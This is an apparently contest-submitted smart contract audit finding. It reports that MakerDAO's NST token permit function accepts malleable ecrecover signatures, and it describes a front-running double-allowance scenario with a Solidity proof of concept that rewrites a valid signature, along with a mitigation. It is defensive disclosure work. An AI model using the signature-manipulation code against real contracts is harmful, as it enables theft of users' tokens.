Unique Pistachio Chipmunk

High

# Signature malleability problem, possibly leading to double allowance and spending.

### Summary

The original signature can be manipulated into another signature that is still valid. If an external contract uses a transation Id based on the signature to check whether a permit has been used or not, then a double allowance and spending is possible. This might lead to loss of funds. 

A double spending/allowance is a 100% loss, therefore, I mark this as *high*.

### Root Cause

It is well known that Ethereum's ```ecrecover``` function is subject to the signature malleability problem; see: 
[https://medium.com/draftkings-engineering/signature-malleability-7a804429b14a](https://medium.com/draftkings-engineering/signature-malleability-7a804429b14a)



The following function uses ```ecrecover``` and thus has a problem: 

[https://github.com/sherlock-audit/2024-06-makerdao-endgame/blob/dba30d7a676c20dfed3bda8c52fd6702e2e85bb1/nst/src/Nst.sol#L191-L208](https://github.com/sherlock-audit/2024-06-makerdao-endgame/blob/dba30d7a676c20dfed3bda8c52fd6702e2e85bb1/nst/src/Nst.sol#L191-L208)

### Internal pre-conditions

None

### External pre-conditions

An external contract might use signature-based transactionId to check whether a permit signature has been used before. As a result, even though a variant of the original signature was executed, the external contract will think the original signature was not used. As a result, a new signature might be signed, and double spending becomes possible. 


### Attack Path
Initial Permit Setup:

    Owner: Bob
    Spender: Alice
    Allowance: Bob gives Alice permission to spend 100 NST tokens.
    Bob signs a permit with a nonce, a deadline, and other details.

Signature Malleability:

    An attacker, Eve, notices (when front-running BobContract.authorizeTransfer()) that Bob's permit signature can be changed to another still valid signature (see manipulateSignature() in the POC), so Eve crafts and uses an alternate valid signature (with a different v value) to call the permit function before the deadline, granting Alice the allowance.

Signature Expiry and Reissuance:

    After the deadline expires, Bob believes that the original permit was not used due to the signature malleability issue.
    Bob issues a new permit signature for Alice with a new nonce and possibly a new deadline.

Double Allowance:

    The new permit signature is intended to replace the old one, but since the attacker has already used the original (or an alternate valid version), Bob’s new permit may end up granting additional allowance to Alice (or Eve) beyond what was intended.

### Impact

It uses Ethereum's ecrecover, as a result,  different signature is used to execute the transaction, making the original caller to think that the transaction didn't go through although it was successful, this can lead to double allowance and spending.

### PoC
The function ```manipulateSignature()``` takes the original signature and generates a new signature, which is also valid. 
```javascript

    function manipulateSignature(bytes memory signature) public pure returns(bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);

        uint8 manipulatedV = v % 2 == 0 ? v - 1 : v + 1;
        uint256 manipulatedS = modNegS(uint256(s));
        bytes memory manipulatedSignature = abi.encodePacked(r, bytes32(manipulatedS), manipulatedV);

        return manipulatedSignature;
    }

    function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
        require(sig.length == 65, "Invalid signature length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        if (v < 27) {
            v += 27;
        }
        require(v == 27 || v == 28, "Invalid signature v value");
    }
```

Below, we show how the malleability vulnerability can be exploited to mislead an owner (BobContract) to give twice allowance to a spender (SpenderContract), leading to double transfer of 5000 NSts.

Attack Scenario

    Initial Setup:
        BobContract is set up with a authorizeTransfer() function that uses nstToken.permit() to grant a spender permission to transfer NST tokens from BobContract.

    Front-Running Attack:
        The attacker, Eve, notices that BobContract is about to call authorizeTransfer().
        Eve executes a front-running transaction that uses a manipulated signature to call nstToken.permit() directly before BobContract's transaction is mined.

    Eve Executes Transfer:
        Using the manipulated permit, Eve calls SpenderContract.performTransfer() to transfer NST tokens from BobContract to an account she controls, Alice.

    BobContract's authorizeTransfer() Call:
        BobContract proceeds with its authorizeTransfer() call, which fails since the nonce was used, but the transfer has already been executed due to Eve's front-running.

   Bob creates another valid signature since he thought the original transaction fails (```executedTransactions[txId] = false```). This allows double allowance and thus double transfers to occur, which is a loss of funds. 

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface INst {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract BobContract {
    mapping(bytes32 => bool) public executedTransactions; // Track executed transactions

    INst public nstToken; // NST token contract

    constructor(address _nstToken) {
        nstToken = INst(_nstToken);
    }

    function authorizeTransfer(
        address spenderContract,
        address recipient,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Create a transaction ID based on permit details
        bytes32 txId = keccak256(abi.encodePacked(spenderContract, recipient, value, deadline, r, s, v));

        // Check if this transaction ID has already been executed, but a variant of the original signature might be used to get around this
        require(!executedTransactions[txId], "BobContract: transaction already executed");

        // Mark transaction as executed
        executedTransactions[txId] = true;

        // Authorize the spender contract with the permit
        nstToken.permit(address(this), spenderContract, value, deadline, v, r, s);

        // Call the spender contract to perform the transfer
        ISpender(spenderContract).performTransfer(address(nstToken), recipient, value);
    }
}

interface ISpender {
    function performTransfer(address token, address recipient, uint256 value) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface INst {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract SpenderContract {
    function performTransfer(address token, address recipient, uint256 value) external {
        INst(token).transferFrom(msg.sender, recipient, value);
    }
}

```


### Mitigation
Use the latest version of the OpenZeppelin ECDSA library. 